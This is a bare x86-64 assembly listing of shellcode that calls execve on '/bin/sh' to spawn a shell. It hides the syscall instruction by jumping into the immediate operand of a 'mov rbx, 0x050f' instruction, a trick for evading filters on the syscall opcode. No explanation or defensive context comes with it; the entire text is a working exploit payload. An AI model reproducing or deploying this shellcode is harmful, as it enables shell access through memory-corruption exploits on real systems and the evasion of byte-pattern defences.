BITS 64
DEFAULT REL
dummy:
mov rbx, 0x050f
mov rax, 0x3a
inc rax
lea rdi, [sh]
push 0
mov rdx, rsp
push rdi
mov rsi, rsp
jmp short dummy+1
sh:
db "/bin/sh",0
